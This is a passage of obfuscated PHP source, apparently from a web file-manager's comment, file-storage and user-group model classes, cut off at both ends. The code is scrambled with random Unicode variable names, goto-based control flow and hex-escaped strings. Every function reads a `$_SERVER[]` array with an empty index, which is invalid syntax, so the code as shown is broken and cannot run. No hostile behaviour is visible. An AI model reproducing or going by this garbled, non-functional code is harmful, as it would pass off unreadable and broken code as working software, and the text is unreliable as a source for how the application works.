($f߇쓡) { return !1; } $FÑγ[$eݺ[1371]] = 0; $FÑγ[$eݺ[2089]] = $this->getSort(); return parent::insert($FÑγ); } private function getSort() { $Fфޤ =& $_SERVER[]; $F = parent::listData(); $B֤ = array_to_keyvalue($F, $Fфޤ[33], $Fфޤ[2089]); return empty($B֤) ? 0 : max($B֤) + 1; } public function update($fĭ̢, $bئ) { $Eĳ =& $_SERVER[]; $b߹ = $this->listData($fĭ̢); $bߌ = $this->findByName($bئ[$Eĳ[28]]); if (!$b߹ || $bߌ && $bߌ[$Eĳ[363]] != $b߹[$Eĳ[363]]) { return !1; } return parent::update($fĭ̢, $bئ); } public function remove($C, $Eۂ = false) { $A =& $_SERVER[]; $bÐ = $this->listData($C); if (!$bÐ) { return; } if (!$Eۂ && $bÐ[$A[1067]] == $A[83]) { return !1; } return parent::remove($C); } public function enable($fůʒ, $fԒ굨) { return $this->update($fůʒ, array($_SERVER[][2439] => $fԒ굨)); } public function run($f򋅰悜) { return $this->update($f򋅰悜, array($_SERVER[][2449] => time())); } } goto AÏ; Fƹ: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\145\x6e\164"; protected $tableMeta = array("\164\141\142\154\145\116\x61\x6d\x65" => "\x63\x6f\155\155\145\x6e\164\137\x6d\x65\164\x61", "\155\x65\164\141\106\151\145\x6c\x64" => "\143\157\155\x6d\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($B) { $AҦ =& $_SERVER[]; if ($B[$AҦ[2095]]) { $d휒 = $this->where(array($AҦ[2096] => $B[$AҦ[2095]]))->find(); if (!$d휒 || $d휒[$AҦ[367]] != $B[$AҦ[367]] || $d휒[$AҦ[452]] != $B[$AҦ[452]]) { return !1; } $this->where(array($AҦ[2096] => $B[$AҦ[2095]]))->setAdd($AҦ[2097], 1); } return $this->add($B); } public function remove($c) { $e󢍺 =& $_SERVER[]; $C܄ = array($e󢍺[2096] => $c); $b𻩔 = $this->where($C܄)->find(); if ($b𻩔[$e󢍺[2095]]) { $this->where(array($e󢍺[2096] => $b𻩔[$e󢍺[2095]]))->setAdd($e󢍺[2097], -1); } return $this->where($C܄)->delete(); } public function edit($E͙, $d) { $A =& $_SERVER[]; $C = array($A[2096] => $E͙); return $this->where($C)->save(array($A[2098] => $d)); } public function prasise($főð) { $Dߞҏ =& $_SERVER[]; $b̆ = Model($Dߞҏ[2099]); $AÃ = array($Dߞҏ[2096] => $főð, $Dߞҏ[1397] => USER_ID); $a貂 = $b̆->where($AÃ)->find(); if (!$a貂) { $b̆->add($AÃ); $Aح = $this->where(array($Dߞҏ[2096] => $főð))->setAdd($Dߞҏ[2100], 1); } else { $b̆->where($AÃ)->delete(); $Aح = $this->where(array($Dߞҏ[2096] => $főð))->setAdd($Dߞҏ[2100], -1); } return $Aح; } public function targetInfo($d⼔, $E) { goto DɄ; D콪: $Cׅʞ = "\122\111\107\110\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\x74\137\160\162\141\151\x73\x65\x20\x73\164\141\x72\40\x6f\x6e\x20\x63\x6f\155\x6d\x65\156\164\56\x63\x6f\155\155\145\156\164\111\104\40\75\40\x73\x74\141\162\56\143\x6f\155\x6d\145\156\x74\111\x44"; $cُ = $this->alias($C[337])->where($Dɚ)->join($Cׅʞ, $C[2101])->count(); $FЈ = array($C[2102] => $e޸, $C[2103] => $cُ); goto F̎; F̎: return $FЈ; goto b; DɄ: $C =& $_SERVER[]; $Dɚ = array($C[517] => $d⼔, $C[518] => $E); $e޸ = $this->where($Dɚ)->count(); goto D콪; b: } public function listData($Eǅ) { $f۴ =& $_SERVER[]; if (isset($Eǅ[$f۴[2104]])) { if ($Eǅ[$f۴[2104]]) { $Eǅ[$f۴[2105]] = array($f۴[914], intval($Eǅ[$f۴[2104]])); } unset($Eǅ[$f۴[2104]]); } if (isset($Eǅ[$f۴[2106]])) { if ($Eǅ[$f۴[2106]]) { $Eǅ[$f۴[2105]] = array($f۴[911], intval($Eǅ[$f۴[2106]])); } unset($Eǅ[$f۴[2106]]); } return $this->_listData($Eǅ); } private function _listData($b㘶) { $d =& $_SERVER[]; $A޿ = $this->where($b㘶)->_makeOrder()->selectPage(100); $this->_listAppendParent($A޿[$d[350]]); $this->_listAppendUser($A޿[$d[350]]); $this->_listAppendMeta($A޿[$d[350]]); return $A޿; } private function _makeOrder() { $bҾ΍ =& $_SERVER[]; $dԳ = array($bҾ΍[2100], $bҾ΍[2097], $bҾ΍[183]); $Cۓ̷ = Input::get($bҾ΍[403], $bҾ΍[7], $bҾ΍[385], $dԳ); $Bѳ = Input::get($bҾ΍[404], $bҾ΍[7], $bҾ΍[1399], array($bҾ΍[2107], $bҾ΍[401])); $dןɩ = $Cۓ̷ . $bҾ΍[50] . $Bѳ; return $this->order($dןɩ); } private function _listAppendParent(&$A) { goto Dۄ; B󊷪: if (!$CÄ݅ݫ) { return; } $B駢 = $this->where(array($eΧ益[2096] => array($eΧ益[7], $CÄ݅ݫ)))->select(); $B駢 = array_to_keyvalue($B駢, $eΧ益[2105]); goto d; Dۄ: $eΧ益 =& $_SERVER[]; $CÄ݅ݫ = array_unique(array_to_keyvalue($A, $eΧ益[33], $eΧ益[2095])); $CÄ݅ݫ = array_remove_value($CÄ݅ݫ, $eΧ益[464]); goto B󊷪; d: foreach ($A as &$Aƃ) { if (isset($B駢[$Aƃ[$eΧ益[2095]]])) { $Aƃ[$eΧ益[2108]] = $B駢[$Aƃ[$eΧ益[2095]]]; } } goto cǑ; cǑ: } private function _listAppendUser(&$Cε) { goto Fߦ; A̬: foreach ($Cε as &$F) { $F[$dÉז[531]] = $a󡱍[$F[$dÉז[1406]]]; if (isset($F[$dÉז[2108]])) { $F[$dÉז[2108]][$dÉז[531]] = $a󡱍[$F[$dÉז[2108]][$dÉז[1406]]]; } } goto Cᑊ; B: if (count($Dɤ) == 0) { return; } foreach ($Cε as $F) { if (isset($F[$dÉז[2108]])) { $Dɤ[] = $F[$dÉז[2108]][$dÉז[1406]]; } } $a󡱍 = Model($dÉז[473])->userListInfo($Dɤ); goto A̬; Fߦ: $dÉז =& $_SERVER[]; $Dɤ = array_unique(array_to_keyvalue($Cε, $dÉז[33], $dÉז[1406])); $Dɤ = array_remove_value($Dɤ, $dÉז[464]); goto B; Cᑊ: } private function _listAppendMeta(&$E) { goto c; b: if (!$Aܓ) { return !1; } foreach ($E as &$F) { $F[$d莄[413]] = $Aܓ[$F[$d莄[2105]]]; if (isset($F[$d莄[2108]])) { $F[$d莄[2108]][$d莄[413]] = $Aܓ[$F[$d莄[2108]][$d莄[2105]]]; } } goto A; c: $d莄 =& $_SERVER[]; $Eћ = array_unique(array_to_keyvalue($E, $d莄[33], $d莄[2105])); $Eћ = array_remove_value($Eћ, $d莄[464]); goto cݑǋ; cݑǋ: if (!$Eћ) { return; } foreach ($E as $F) { if (isset($F[$d莄[2108]])) { $Eћ[] = $F[$d莄[2108]][$d莄[2105]]; } } $Aܓ = $this->metaList($Eћ); goto b; A: } private function metaList($cɏ) { goto cڧ; F: return $Eē ? $Eē : array(); goto b҆; A󳪫: $Eē = Model($dʛ[2109])->where($b乾Ս)->select(); $Eē = array_to_keyvalue_group($Eē, $dʛ[2105]); foreach ($Eē as $Cᜅʪ => $E) { $B䝼 = array(); foreach ($E as $CÂ) { $B䝼[$CÂ[$dʛ[89]]] = $CÂ[$dʛ[355]]; } $Eē[$Cᜅʪ] = $B䝼; } goto F; cڧ: $dʛ =& $_SERVER[]; if (!$cɏ) { return array(); } $b乾Ս = array($dʛ[2105] => array($dʛ[7], $cɏ)); goto A󳪫; b҆: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\155\145" => "\151\157\x5f\146\x69\154\x65\x5f\155\x65\164\x61", "\x6d\x65\164\141\x46\x69\145\154\144" => "\146\151\154\x65\x49\x44"); public function fileInfo($b) { $Cվ =& $_SERVER[]; static $Fۘ = array(); if (!isset($Fۘ[$b])) { $Eϊ = $Cվ[2110]; $C = Model($Cվ[418])->field($Eϊ)->where(array($Cվ[416] => $b))->find(); $Fۘ[$b] = $C; } return $Fۘ[$b]; } public function addFileByContent($aϟ = '', $Bϰ = '') { goto A; FͲ: if (file_exists($aś)) { @unlink($aś); } return $D֔ť; goto C; BѹÕ: $aś = $BͺɎ . $a[2112] . rand_string(16); file_put_contents($aś, $aϟ); $D֔ť = $this->addFile($aś, $Bϰ, !0); goto FͲ; A: $a =& $_SERVER[]; $BͺɎ = TEMP_PATH . $a[2111]; if (!is_dir($BͺɎ)) { mk_dir($BͺɎ); } goto BѹÕ; C: } public function createFileName($cΩՃ) { goto dő֨; eߚҰ: $fڈݘ = $b->pathFather($aΖǌ); static $EԹ = false; $dً = $bŘ[2113] . md5($fڈݘ); goto Cٌ; Cٌ: if (!$EԹ && !Cache::get($dً)) { $EԹ = !0; $eѨ = IO::mkdir($fڈݘ); if (!IO::exist($eѨ . $bŘ[2114])) { IO::mkfile($eѨ . $bŘ[2114]); } Cache::set($dً, 1, 3600 * 2); } return $aΖǌ; goto E; dő֨: $bŘ =& $_SERVER[]; $b = IO::init($bŘ[8]); $aΖǌ = $this->makeFilePath($cΩՃ, $b); goto eߚҰ; E: } public function makeFilePath($f˚, $Fڛա) { goto D꟱; d索: $Cٱҕ = $a׋ . rand_string(5) . short_id(100); $f˚ = str_replace($B[8], $B[70], KodIO::clear($f˚)); if (!$f˚) { $Dصݣ = $B[2117]; } goto cۦ; cۦ: switch ($Dصݣ) { case $B[2118]: $Cٱҕ = $Cٱҕ . $B[91] . $Fڛա->ext($f˚); if ($Fڛա->ext($f˚) == $B[2058]) { $Cٱҕ .= $B[2119]; } break; case $B[2120]: goto d; d: $BАǤ = Model($B[1075])->get($B[1306]); $Dˣ = substr(md5($B[1878] . $BАǤ . date($B[673])), 0, 8); $a׋ = KodIO::defaultIO() . date($B[2121]) . $Dˣ . $B[8]; goto bֿ; Eޏ: break; goto b஘; bֿ: if ($Fڛա->ext($f˚) == $B[2058]) { $f˚ .= $B[2119]; } $DѬ = IO::fileNameAuto($a׋, $f˚); $Cٱҕ = $a׋ . $DѬ; goto Eޏ; b஘: case $B[2117]: break; default: break; } return $Cٱҕ; goto D奶Ƀ; D꟱: $B =& $_SERVER[]; $Dصݣ = Model($B[1075])->get($B[2115]); $a׋ = KodIO::defaultIO() . date($B[2116]); goto d索; D奶Ƀ: } public function addFileByRemote($cɗ, $d, $a빹 = array()) { goto E; E: $bɄ =& $_SERVER[]; if (!IO::exist($cɗ)) { return !1; } $e = $a빹[$bɄ[159]] ? $a빹[$bɄ[159]] : $bɄ[33]; goto aӨ; A: if ($e = $this->addFileCheckExist($f̏[$bɄ[160]], $f̏[$bɄ[159]], $f̏[$bɄ[77]])) { return $e; } return $this->addFileData($f̏); goto aꞜ׮; aӨ: $C = IO::hashMd5($cɗ, $e); $AЯ = KodIO::defaultDriver(); $f̏ = array($bɄ[516] => IO::size($cɗ), $bɄ[2122] => 1, $bɄ[382] => $d, $bɄ[721] => $AЯ[$bɄ[363]], $bɄ[383] => $cɗ, $bɄ[2123] => $a빹[$bɄ[160]] ? $a빹[$bɄ[160]] : IO::hashSimple($cɗ), $bɄ[2124] => $C ? $C : $e); goto A; aꞜ׮: } private function addFileData($BΏ) { $b =& $_SERVER[]; if (!$BΏ) { return !1; } $BΏ[$b[77]] = intval($BΏ[$b[77]]); if (!$BΏ[$b[77]] && strlen($BΏ[$b[160]]) > 32) { $BΏ[$b[77]] = intval(substr($BΏ[$b[160]], 32)); } $C = $this->add($BΏ); return $this->find($C); } public function addFile($Dʎä, $eЛ, $D҆ = false) { $cÜդ = IO::hashSimple($Dʎä); $f鈎° = IO::hashMd5($Dʎä); $B㵒 = IO::size($Dʎä); if ($B = $this->addFileCheckExist($cÜդ, $f鈎°, $B㵒)) { return $B; } $D肰 = $this->addFileMake($Dʎä, $B㵒, $cÜդ, $f鈎°, $eЛ, $D҆); return $this->addFileData($D肰); } public function addFileMake($Fִ, $B, $dͲ΄, $C苃, $B͡Ւ, $F߉) { goto DߟΛ; DߟΛ: $cܹ =& $_SERVER[]; $aһ = $this->createFileName($B͡Ւ); $d۽ = get_path_father($aһ); goto F֘; c₊: $d = KodIO::defaultDriver(); $Aµ = array($cܹ[516] => $B, $cܹ[2122] => 1, $cܹ[382] => $B͡Ւ, $cܹ[721] => $d[$cܹ[363]], $cܹ[383] => $aһ, $cܹ[2123] => $dͲ΄, $cܹ[2124] => $C苃); return $Aµ; goto A߾̻; F֘: $B̉ = get_path_this($aһ); if ($F߉) { $eޚ = IO::move($Fִ, $d۽, !1, $B̉); } else { $eޚ = IO::copy($Fִ, $d۽, !1, $B̉); } if (!$eޚ) { return !1; } goto c₊; A߾̻: } public function addFileCheckExist($AǛ, $Bڈ, $Aø) { $Eڇ =& $_SERVER[]; $C喬 = $this->findByHash($AǛ, $Bڈ); if (!$C喬) { return !1; } $bՅ = array($Eڇ[2122] => intval($C喬[$Eڇ[2125]]) + 1, $Eڇ[516] => $Aø); $this->where(array($Eڇ[416] => $C喬[$Eڇ[415]]))->save($bՅ); return $C喬; } public function remove($F) { $this->linkCountChange($F, !1); $this->clearEmpty(); return !0; } public function linkAdd($c) { $this->linkCountChange($c, !0); } public function linkCountChange($AḬ̑, $b랭) { goto Cŋ; F: $dȦ = array(); foreach ($AḬ̑ as $E޸) { $D = $E޸ . $a吗[33]; if (!$dȦ[$D]) { $dȦ[$D] = 0; } $dȦ[$D]++; } $Fޒ߂ = array(); goto C; Cŋ: $a吗 =& $_SERVER[]; if (!$AḬ̑) { return; } if (!is_array($AḬ̑)) { $AḬ̑ = array($AḬ̑); } goto F; C: foreach ($dȦ as $E޸ => $A٨) { $D = $A٨ . $a吗[33]; if (!$Fޒ߂[$D]) { $Fޒ߂[$D] = array(); } $Fޒ߂[$D][] = $E޸; } foreach ($Fޒ߂ as $A٨ => $aƳ) { if (!$aƳ) { continue; } $A٨ = $b랭 ? $A٨ : -intval($A٨); $D׻͠ = array($a吗[415] => array($a吗[7], $aƳ)); if ($A٨ < 0) { $D׻͠[$a吗[2125]] = array($a吗[915], abs($A٨)); } $this->where($D׻͠)->setAdd($a吗[2125], $A٨); } goto Eު; Eު: } public function findByHash($Fϓ, $e = false) { $aЏɫ =& $_SERVER[]; if (!$Fϓ && !$e) { return !1; } $E = array($aЏɫ[2123] => $Fϓ); if ($e) { $E = array($aЏɫ[2124] => $e); } return $this->order($aЏɫ[2126])->where($E)->find(); } public function clearEmpty($fۘ = 0) { goto d镎錐; e: foreach ($aީ as $Aϫ) { $Dߐ->update(1); $this->resetFile($Aϫ); } $Dߐ->end(); goto fĞ; d镎錐: $C =& $_SERVER[]; $D = time() - 3600 * 24 * $fۘ; $eʪ = $C[2127] . $D; goto fԉ; fԉ: $aީ = $this->where($eʪ)->select(); if (!$aީ) { return; } $Dߐ = new Task($C[2128], $C[33], count($aީ)); goto e; fĞ: } private function resetFile($fΚ) { goto aϺڥ; Bٴے: $cϦ = Model($a݄[2129])->where($Eҥ)->count(); $cʜ = intval($D) + intval($cϦ); if ($cʜ == 0) { IO::remove($fΚ[$a݄[75]]); $this->where($Eҥ)->delete(); $this->metaSet($fΚ[$a݄[415]], null, null); return; } goto Cݶ; Cݶ: if ($fΚ[$a݄[2125]] != $cʜ) { $this->where($Eҥ)->save(array($a݄[2122] => $cʜ)); } goto f̳; aϺڥ: $a݄ =& $_SERVER[]; $Eҥ = array($a݄[416] => $fΚ[$a݄[415]]); $D = Model($a݄[1097])->where($Eҥ)->count(); goto Bٴے; f̳: } public function storageInfo($f = false) { goto Dѕ; Dѕ: $E٘ =& $_SERVER[]; $Eޫ = $this->count() + 0.0; $b = 0; goto Cꤽ; Cꤽ: $f = 1; $fե = 0; $bɃ븪 = 5000; goto dބ; dބ: for ($Aǳ = 0; $Aǳ < $Eޫ; $Aǳ = $Aǳ + $bɃ븪) { $e = $this->limit($Aǳ, $Aǳ + $bɃ븪)->select(); foreach ($e as $C) { $f += $C[$E٘[77]] * $C[$E٘[2125]]; $b += $C[$E٘[77]] * ($C[$E٘[2125]] - 1); $fե += $C[$E٘[2125]]; } } $c߷ = array($E٘[2130] => $f, $E٘[2131] => $b, $E٘[2132] => $b / $f, $E٘[81] => $Eޫ, $E٘[2133] => $fե); return $c߷; goto E؆; E؆: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\x62\154\x65\116\141\155\x65" => "\147\162\x6f\165\x70\137\x6d\145\x74\141", "\155\x65\164\141\x46\151\x65\154\x64" => "\147\x72\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($Bɒ) { $fٮ =& $_SERVER[]; return array($fٮ[2134] => array($Bɒ[0], $fٮ[2135]), $fٮ[2136] => array($Bɒ[0], $fٮ[2135])); } protected function getInfo($a) { $D҉ = $this->getInfoSimple($a); if (!$D҉) { return !1; } return $this->_listDataApplyItem($D҉); } protected function getInfoSimple($f⹺, $Dבּ = false) { $E⫉ =& $_SERVER[]; if ($Dבּ) { $eڂ = array($E⫉[2068] => intval($f⹺)); $D = $this->where($eڂ)->find(); return is_array($D) ? $D : array(); } return $this->cacheFunctionGet($E⫉[2137], $f⹺); } protected function groupAdd($f嫃) { goto E݋; F: if ($F[$fΞ[455]]) { $C݉Ŗ = $F[$fΞ[455]] . $F[$fΞ[2068]] . $fΞ[47]; } $dޡ = array($fΞ[382] => $this->groupNameAuto($f嫃[$fΞ[457]], $f嫃[$fΞ[28]]), $fΞ[364] => $f嫃[$fΞ[457]], $fΞ[521] => $C݉Ŗ, $fΞ[2138] => $f嫃[$fΞ[2052]], $fΞ[2139] => 0, $fΞ[2072] => 0); if (isset($f嫃[$fΞ[2089]])) { $dޡ[$fΞ[2089]] = $f嫃[$fΞ[2089]]; } else { $dǡʌ߯ = $this->max($fΞ[2089]); if (!$dǡʌ߯) { $dǡʌ߯ = 0; } $dޡ[$fΞ[2089]] = $dǡʌ߯ + 1; } goto C⠋; C⠋: if (!empty($f嫃[$fΞ[2068]])) { $dޡ[$fΞ[2068]] = $f嫃[$fΞ[2068]]; } $d = $this->add($dޡ); $this->setNamePinyin($d, $dޡ[$fΞ[28]]); goto dЪ; dЪ: Model($fΞ[1097])->groupRootAdd($d); return $d; goto E쉵; E݋: $fΞ =& $_SERVER[]; if (!$f嫃[$fΞ[457]] && isset($f嫃[$fΞ[2068]]) && $f嫃[$fΞ[2068]] == 1) { if ($F = $this->getInfoSimple($f嫃[$fΞ[2068]], !0)) { return $f嫃[$fΞ[2068]]; } } else { $F = $this->getInfoSimple($f嫃[$fΞ[457]]); if (!$F) { return !1; } } $C݉Ŗ = $fΞ[466]; goto F; E쉵: } protected function groupEdit($Bʆ, $f٭ۢ) { $B׈ =& $_SERVER[]; if (!empty($f٭ۢ[$B׈[457]])) { $Dȫҡ = $this->getInfoSimple($Bʆ); $bկ = $this->getInfoSimple($f٭ۢ[$B׈[457]]); if (!$Dȫҡ || !$bկ) { return !1; } if ($Dȫҡ[$B׈[2068]] == $bկ[$B׈[2068]]) { return !1; } if ($f٭ۢ[$B׈[457]] != $Dȫҡ[$B׈[457]]) { if ($bկ[$B׈[455]] !== $Dȫҡ[$B׈[455]] && strpos($bկ[$B׈[455]], $Dȫҡ[$B׈[455]] . $Dȫҡ[$B׈[2068]] . $B׈[47]) === 0) { return !1; } $f٭ۢ[$B׈[521]] = $bկ[$B׈[455]] . $f٭ۢ[$B׈[457]] . $B׈[47]; $this->_changeChildLevel($Dȫҡ, $bկ); } } if (isset($f٭ۢ[$B׈[28]])) { $this->setNamePinyin($Bʆ, $f٭ۢ[$B׈[28]]); } return $this->where(array($B׈[2140] => $Bʆ))->save($f٭ۢ); } private function _changeChildLevel($CƠ, $E㐖, $d쫪в = false) { goto Eº; Fʛ: $this->where($e)->data($D׏)->save(); goto D; Eº: $E溊 =& $_SERVER[]; $A = $CƠ[$E溊[455]] . $CƠ[$E溊[2068]] . $E溊[47]; $cя = $E㐖[$E溊[455]] . $E㐖[$E溊[2068]] . $E溊[47] . $CƠ[$E溊[2068]] . $E溊[47]; goto a; a: if ($d쫪в) { $cя = $E㐖[$E溊[455]] . $E㐖[$E溊[2068]] . $E溊[47]; } $e = array($E溊[521] => array($E溊[479], $CƠ[$E溊[455]] . $CƠ[$E溊[2068]] . $E溊[480])); $D׏ = array($E溊[521] => array($E溊[530], "\x72\x65\x70\154\141\143\145\50\x70\x61\x72\x65\x6e\164\114\x65\x76\x65\x6c\54\47{$A}\x27\54\x27{$cя}\x27\x29")); goto Fʛ; D: } public function setNamePinyin($c, $b׆ = false) { $BЄۄ =& $_SERVER[]; if (!$b׆) { $C = $this->getInfoSimple($c); $b׆ = $C[$BЄۄ[28]]; } if (!Input::check($b׆, $BЄۄ[524])) { $this->metaSet($c, $BЄۄ[412], null); $this->metaSet($c, $BЄۄ[411], null); return; } $a = array($BЄۄ[412] => str_replace($BЄۄ[50], $BЄۄ[33], Pinyin::encode($b׆)), $BЄۄ[411] => Pinyin::encode($b׆, $BЄۄ[525])); $this->metaSet($c, $a); } protected function groupStatus($Fι, $d݈, $C = true) { $C =& $_SERVER[]; $Bӊ􋬈 = $this->getInfoSimple($Fι); if (!$Bӊ􋬈) { return !1; } if ($C) { $this->_groupStatusApply($Bӊ􋬈, $d݈); } $aފ = array($C[2068] => $Fι, $C[89] => $C[675], $C[355] => $d݈); return Model($C[2141])->add($aފ, array(), !0); } private function _groupStatusApply($A, $B) { $e =& $_SERVER[]; if ($B == $e[83]) { $cВ = $this->parentLevelArray($A[$e[455]]); } else { $Cݯ = array($e[521] => array($e[479], $A[$e[455]] . $A[$e[2068]] . $e[480])); $cВ = $this->where($Cݯ)->field($e[2068])->select(); $cВ = array_to_keyvalue($cВ, $e[33], $e[2068]); } if (empty($cВ)) { return; } $Cݯ = array($e[2068] => array($e[7], $cВ), $e[89] => $e[675], $e[355] => $B ? $e[464] : $e[83]); Model($e[2141])->where($Cݯ)->save(array($e[355] => $B)); } protected function groupRemove($e赦ˈ) { goto Dܞ; Dʯ: $this->where(array($bߓ[457] => $e赦ˈ))->save(array($bߓ[457] => $Fǃ̅[$bߓ[457]])); Model($bߓ[2141])->where($Bȅ)->delete(); Model($bߓ[2142])->where($Bȅ)->delete(); goto Eن; eɋ: if (!$Fǃ̅ || $Fǃ̅[$bߓ[457]] == 0) { return !1; } $F = $this->getInfoSimple($Fǃ̅[$bߓ[457]]); $this->_changeChildLevel($Fǃ̅, $F, !0); goto Dʯ; Dܞ: $bߓ =& $_SERVER[]; $Bȅ = array($bߓ[2068] => $e赦ˈ); $Fǃ̅ = $this->where($Bȅ)->find(); goto eɋ; Eن: Model($bߓ[738])->groupRootRemove($e赦ˈ); return $this->where($Bȅ)->delete(); goto F; F: } public function listData() { $c舊ؼ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c舊ؼ[$_SERVER[][350]]); return $c舊ؼ; } private function _makeOrder($d = '') { goto D̚; fĂ: $Dދ = Input::get($fÍ[403], $fÍ[7], $fÍ[2072], $EȦ); $aŶ = Input::get($fÍ[404], $fÍ[7], $fÍ[2143], array($fÍ[2143], $fÍ[400])); $aŶ = $fʏݧ[$aŶ]; goto aث; aث: $d = $d . "{$Dދ}\x20{$aŶ}\x2c\x20\x67\x72\x6f\165\160\111\104\40\x61\x73\143"; return $this->order($d); goto A缍; D̚: $fÍ =& $_SERVER[]; $EȦ = array($fÍ[2068], $fÍ[28], $fÍ[2054], $fÍ[183]); $fʏݧ = array($fÍ[398] => $fÍ[399], $fÍ[400] => $fÍ[401]); goto fĂ; A缍: } public function listChild($D) { $a =& $_SERVER[]; $F = $this->where(array($a[457] => $D))->_makeOrder()->selectPage(200); $this->_listDataApply($F[$a[350]]); return $F; } public function listByID($E򈋍) { $E =& $_SERVER[]; if (!$E򈋍) { return array(); } $cҾ = array($E[2068] => array($E[7], $E򈋍)); $C߿剺 = $this->where($cҾ)->select(); $this->_listDataApply($C߿剺); return $C߿剺; } public function listSearch($a) { goto CȻ; E²: $E = $this->_makeOrder()->where($aӠ)->selectPage(20); $E = $E ? $E : array(); if (!$E || count($E[$Aϱ[350]]) < 5 && Input::check($B󎊷, $Aϱ[302])) { $cΙ = $this->_searchFromMeta($Aϱ[411], $B󎊷, 10); $a둉 = $this->_searchFromMeta($Aϱ[412], $B󎊷, 10); $C뿍 = array_merge($cΙ, $a둉, $E[$Aϱ[350]]); $E[$Aϱ[350]] = array_unique_by_key($C뿍, $Aϱ[2068]); $E[$Aϱ[347]][$Aϱ[348]] = count($E[$Aϱ[350]]); $E[$Aϱ[347]][$Aϱ[349]] = ceil($E[$Aϱ[347]][$Aϱ[348]] / $E[$Aϱ[347]][$Aϱ[345]]); } goto dӰɎ; e: if (!trim($B󎊷)) { return !1; } $B󎊷 = str_replace($Aϱ[2146], $Aϱ[2147], $B󎊷); $aӠ = array($Aϱ[2068] => array($Aϱ[737], "\x25{$B󎊷}\x25"), $Aϱ[28] => array($Aϱ[737], "\45{$B󎊷}\x25"), $Aϱ[900] => $Aϱ[2148]); goto E²; CȻ: $Aϱ =& $_SERVER[]; $B󎊷 = $a[$Aϱ[2144]]; $e = isset($a[$Aϱ[2145]]) ? $a[$Aϱ[2145]] : !1; goto e; dӰɎ: $this->_listDataApply($E[$Aϱ[350]]); return $E; goto B; B: } private function _searchFromMeta($B͍, $E˶, $F⢙) { goto f; C㱃: $bĒ = $this->where(array($c؈[2140] => array($c؈[7], $cܟ)))->select(); if (!$bĒ) { return array(); } return $bĒ; goto a; cݍ: $cܟ = Model($c؈[2149])->where($A)->limit($F⢙)->select(); if (!$cܟ) { return array(); } $cܟ = array_to_keyvalue($cܟ, $c؈[33], $c؈[2068]); goto C㱃; f: $c؈ =& $_SERVER[]; $E˶ = strtolower($E˶); $A = array($c؈[89] => $B͍, $c؈[355] => array($c؈[737], "\45{$E˶}\45")); goto cݍ; a: } protected function _listDataApplyItem($CՉ) { $f = array($CՉ); $this->_listDataApply($f); return $f[0]; } protected function _listDataApply(&$d) { goto dγ; d: $this->_listAppendChildren($d); $this->_listAppendChildrenMember($d); $this->_listAppendMeta($d, $cՎ); goto e཈; dγ: $B =& $_SERVER[]; if (!$d) { return; } $cՎ = array_to_keyvalue($d, $B[33], $B[2068]); goto d; e཈: $this->_listAppendParent($d); $this->_listAppendSourceRoot($d, $cՎ); goto C; C: } private function _listAppendChildren(&$Fȼۊ) { goto b; Bф: $Dڔ፳ = count($Fȼۊ); $a = $this->tablePrefix . $this->tableName; for ($C͍ڐ = 0, $B = 0; $C͍ڐ < $Dڔ፳; $C͍ڐ++) { $B++; $e = $Fȼۊ[$C͍ڐ][$Bة[2068]]; $F .= "\123\105\114\105\103\124\x20\x2a\x20\x46\122\117\x4d\40\x28\123\105\x4c\x45\x43\x54\x20\x27{$e}\137\143\150\x69\154\144\x27\x20\x61\163\40\x68\x61\163\40\106\122\x4f\115\x20\140{$a}\x60\x20\x77\150\x65\162\x65\40\x70\x61\x72\145\x6e\x74\x49\104\75{$e}\x20\x6c\151\x6d\151\x74\x20\61\51\40\141\163\40\x74\x62\x5f{$e}\40\x75\x6e\x69\x6f\156\40\141\154\x6c\40"; if (($B >= 20 || $C͍ڐ == $Dڔ፳ - 1) && $F) { $F = substr($F, 0, -strlen($Bة[445])); $CǪ = $this->query($F); $e͋ = array_merge($e͋, $CǪ); $B = 0; $F = $Bة[33]; } } goto BÅ; b: $Bة =& $_SERVER[]; $F = $Bة[357]; $e͋ = array(); goto Bф; BÅ: $e͋ = array_to_keyvalue($e͋, $Bة[446]); foreach ($Fȼۊ as &$C) { $C[$Bة[2150]] = isset($e͋[$C[$Bة[2068]] . $Bة[2151]]); } goto eѢߐ; eѢߐ: } private function _listAppendChildrenMember(&$D) { goto bįڗ; FѨ㪂: $bاٱ = count($D); $F = $this->tablePrefix . $b䳥[2142]; for ($FϏ = 0, $fۄ = 0; $FϏ < $bاٱ; $FϏ++) { $fۄ++; $B = $D[$FϏ][$b䳥[2068]]; $aׅТ .= "\123\x45\x4c\105\103\124\x20\52\x20\106\x52\117\115\40\x28\123\105\x4c\x45\x43\124\x20\x27{$B}\137\x63\x68\151\154\144\x27\x20\141\x73\40\150\x61\163\40\106\122\117\x4d\x20\140{$F}\x60\40\x77\150\x65\x72\x65\x20\147\162\x6f\165\x70\x49\104\x3d{$B}\x20\x6c\x69\x6d\x69\164\40\61\x29\40\141\163\x20\x74\x62\x5f{$B}\40\165\156\151\157\156\x20\x61\x6c\154\40"; if (($fۄ >= 20 || $FϏ == $bاٱ - 1) && $aׅТ) { $aׅТ = substr($aׅТ, 0, -strlen($b䳥[445])); $cꓢ = $this->query($aׅТ); $FƱ = array_merge($FƱ, $cꓢ); $fۄ = 0; $aׅТ = $b䳥[33]; } } goto D񨌎; D񨌎: $FƱ = array_to_keyvalue($FƱ, $b䳥[446]); foreach ($D as &$Dҷ) { $Dҷ[$b䳥[2152]] = isset($FƱ[$Dҷ[$b䳥[2068]] . $b䳥[2151]]); } goto Eڂ; bįڗ: $b䳥 =& $_SERVER[]; $aׅТ = $b䳥[357]; $FƱ = array(); goto FѨ㪂; Eڂ: } private function _listAppendMeta(&$cҍ, $e诗) { $F٧ė =& $_SERVER[]; $bЧ = array($F٧ė[2068] => array($F٧ė[7], $e诗)); $cш = 